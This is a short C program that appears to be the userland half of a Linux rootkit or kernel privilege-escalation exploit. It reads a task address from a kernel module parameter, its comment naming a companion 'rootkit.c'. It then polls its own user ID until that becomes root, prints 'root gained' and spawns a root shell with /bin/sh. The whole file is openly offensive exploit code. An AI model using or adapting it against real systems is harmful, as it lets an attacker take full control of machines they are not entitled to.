#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
  // just for debugging purposes if rootkit.c cant find address of this task
  char task_phys_addr[4096] = "";
  int f = open("/sys/module/find_proc/parameters/proc_addresses", O_RDONLY | O_CLOEXEC);
  if(f) {
    read(f, task_phys_addr, sizeof(task_phys_addr));
    printf("%s\n", task_phys_addr);
    close(f);
  }

  for(;;) {
    uid_t uid = getuid();
    printf("uid = %d\n", uid);
    if(uid == 0) {
      printf("root gained\n");
      system("/bin/sh");
      return 1;
    }
    usleep(100 * 1000);
  }
}
